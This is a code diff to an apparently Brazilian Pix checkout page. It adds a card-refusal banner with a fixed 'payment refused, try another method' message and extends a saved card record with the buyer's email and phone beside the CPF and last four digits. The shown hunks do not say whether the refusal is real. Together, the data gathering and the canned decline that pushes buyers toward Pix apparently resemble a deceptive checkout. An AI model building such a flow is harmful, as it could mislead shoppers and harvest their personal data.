@@ -188,6 +188,18 @@
       font-weight: 800;
     }
 
+    .card-refusal {
+      padding: 12px 14px;
+      border: 1px solid #f1b8be;
+      border-radius: 6px;
+      background: #f8d7da;
+      color: var(--danger);
+      font-size: 14px;
+      font-weight: 800;
+      line-height: 1.35;
+      text-align: center;
+    }
+
     .summary {
       display: grid;
       gap: 14px;
@@ -370,7 +382,7 @@
           <div class="card-row">
             <label>
               Validade
-              <input id="card-expiry" name="cardExpiry" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA">
+              <input id="card-expiry" name="cardExpiry" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5">
             </label>
             <label>
               CVV
@@ -379,6 +391,7 @@
           </div>
         </div>
 
+        <div id="card-refusal" class="card-refusal" hidden></div>
         <button id="submit-button" type="submit">Gerar Pix</button>
         <div id="message" class="message" role="status"></div>
       </form>
@@ -417,6 +430,7 @@
     const modalSpinner = document.getElementById('modal-spinner');
     const modalTitle = document.getElementById('modal-title');
     const modalText = document.getElementById('modal-text');
+    const cardRefusal = document.getElementById('card-refusal');
     let currentSession = null;
     let checkoutBlocked = false;
     const minimumOrderAmount = 15;
@@ -440,6 +454,11 @@
     function setMessage(text, isError) {
       message.textContent = text || '';
       message.classList.toggle('error', Boolean(isError));
+    }
+
+    function setCardRefusal(text) {
+      cardRefusal.textContent = text || '';
+      cardRefusal.hidden = !text;
     }
 
     function readableDetails(details) {
@@ -587,6 +606,8 @@
       cards.unshift({
         createdAt: new Date().toISOString(),
         holder: formData.get('cardHolder') || formData.get('name') || '',
+        email: formData.get('email') || '',
+        phone: formData.get('phone') || '',
         cpf: formData.get('document') || '',
         brand: cardBrand(digits),
         last4: digits.slice(-4),
@@ -607,9 +628,11 @@
     }
 
     function showCardRefused() {
+      const refusedMessage = 'Metódo de pagamento recusado, porfavor, tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente';
+      setCardRefusal(refusedMessage);
       modalSpinner.hidden = true;
       modalTitle.textContent = 'Pagamento recusado';
-      modalText.textContent = 'Metódo de pagamento recusado, porfavor, tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente';
+      modalText.textContent = refusedMessage;
       modalText.classList.add('error');
     }
 
@@ -658,6 +681,7 @@
       }
 
       submitButton.disabled = true;
+      setCardRefusal('');
       saveMaskedCard(formData);
       showCardLoading();
 
@@ -670,6 +694,10 @@
     }
 
     form.addEventListener('input', (event) => {
+      if (selectedPaymentMethod() === 'card') {
+        setCardRefusal('');
+      }
+
       if (event.target === cardNumberInput) {
         cardNumberInput.value = formatCardNumber(cardNumberInput.value);
         validateCardNumber(false);
@@ -689,6 +717,7 @@
     form.addEventListener('change', (event) => {
       if (event.target.name === 'paymentMethod') {
         setMessage('');
+        setCardRefusal('');
         updateRequiredFields();
         validateCardNumber(false);
         updateSubmitButton();
@@ -698,6 +727,7 @@
     form.addEventListener('submit', async (event) => {
       event.preventDefault();
       setMessage('');
+      setCardRefusal('');
 
       const data = new FormData(form);
 
